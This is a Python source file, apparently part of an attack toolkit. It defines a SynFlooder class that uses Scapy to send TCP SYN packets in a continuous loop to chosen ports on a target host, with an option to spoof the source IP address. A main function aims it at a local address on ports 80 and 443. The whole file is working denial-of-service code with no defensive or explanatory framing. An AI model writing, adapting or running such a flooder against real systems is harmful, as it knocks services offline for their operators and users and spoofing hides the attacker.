from attacker import Attacker

from scapy.all import IP, TCP, send, RandShort

class SynFlooder(Attacker):
	"""
	A class used to represent a Syn flooder

	...

	Attributes
	----------
	target_ports : list
		The ports to which the SYNs will be sent to (default [21, 22, 80, 443])

	Methods
	-------
	print_target_ports()
		Prints the ports to which the SYN packets will be sent

	start()
		Creats the SYN packets and sends it continuously to the target ports
	"""

	target_ports = [21, 22, 80, 443]
	spoof_ip = None

	def __init__(self, target, spoof_ip=None, target_ports=None):
		"""
		Parameters
        ----------
		target : str
			The target's hostname or IP address
		spoof_ip : str, optional
			Spoofed Source IP address
		target_ports : list, optional
			User defined target ports to send SYNs to
		"""
		super().__init__(target, spoof_ip, attack="SYN_FLOOD")

		if target_ports is not None:
			self.target_ports = target_ports

	def print_target_ports(self):
		"""Prints the ports to which the SYN packets will be sent."""
		print("[*] Target ports are:", *self.target_ports)

	def start(self):
		"""Creats the SYN packets and sends it continuously to the target ports"""

		# Create the IP layer
		ip = IP(dst = self.target_ipv4)
		if (self.spoof_ip is not None):
			ip.src = self.spoof_ip

		# Create the SYN
		tcp = TCP(sport=RandShort(), dport=self.target_ports, flags="S", seq=42)

		print("[*] SYN flood Started")

		# Continously send SYNs to the target ports
		send(ip/tcp, verbose = False, loop = True)


def main():
	a = SynFlooder("192.168.1.2", target_ports=[80, 443])
	a.print_target_ip()
	a.print_target_ports()
	a.start()

if __name__ == "__main__":
	main()